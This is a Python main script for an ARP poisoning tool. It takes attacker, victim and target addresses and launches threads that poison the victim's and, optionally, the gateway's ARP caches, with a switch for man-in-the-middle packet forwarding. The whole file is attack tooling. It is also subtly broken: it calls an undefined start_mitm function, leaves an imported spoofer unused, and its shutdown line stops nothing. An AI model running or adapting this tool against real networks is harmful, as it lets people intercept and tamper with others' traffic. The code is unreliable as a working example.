from arppoisoning import send_poison_arp
from src.spoofer import run_spoof
import threading
import argparse
import time

def main():
    parser = argparse.ArgumentParser(description="ARP poisoning tool with optional MITM forwarding")
    parser.add_argument("ipAttacker")
    parser.add_argument("macAttacker")
    parser.add_argument("ipVictim")
    parser.add_argument("macVictim")
    parser.add_argument("ipToSpoof")
    parser.add_argument("macTarget")
    parser.add_argument("iface")
    parser.add_argument("--mode", choices=["reply", "request"], default="reply")
    parser.add_argument("--bi-directional", action="store_true", help="Enable bi-directional ARP spoofing")
    parser.add_argument("--mitm", action="store_true", help="Enable MITM packet forwarding")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")

    args = parser.parse_args()

    args.verbose and print("[*] Initializing ARP spoofing thread to poison victim...")

    poison_threads = []

    # Poison Victim -> Target (usually the gateway)
    poison_threads.append(threading.Thread(
        target=send_poison_arp,
        args=(
            args.ipAttacker,
            args.macAttacker,
            args.ipVictim,
            args.macVictim,
            args.ipToSpoof,
            args.iface,
            args.mode
        )
    ))

    # Poison Target -> Victim if bi-directional mode is enabled
    if args.bi_directional:
        args.verbose and print("[*] Bi-directional mode enabled. Starting second poisoning thread...")
        poison_threads.append(threading.Thread(
            target=send_poison_arp,
            args=(
                args.ipAttacker,
                args.macAttacker,
                args.ipToSpoof,
                args.macTarget,
                args.ipVictim,
                args.iface,
                args.mode
            )
        ))

    # Start MITM thread if requested
    mitm_thread = None
    if args.mitm:
        args.verbose and print("[*] MITM forwarding enabled. Launching MITM thread...")
        mitm_thread = threading.Thread(
            target=start_mitm,
            args=(
                args.macVictim,
                args.macTarget,
                args.macAttacker,
                args.iface
            )
        )
        mitm_thread.daemon = True
        mitm_thread.start()

    # Start all ARP poisoning threads
    for t in poison_threads:
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        threading.Event().set()
        args.verbose and print("\n[!] Attack interrupted. Shutting down...")

if __name__ == "__main__":
    main()
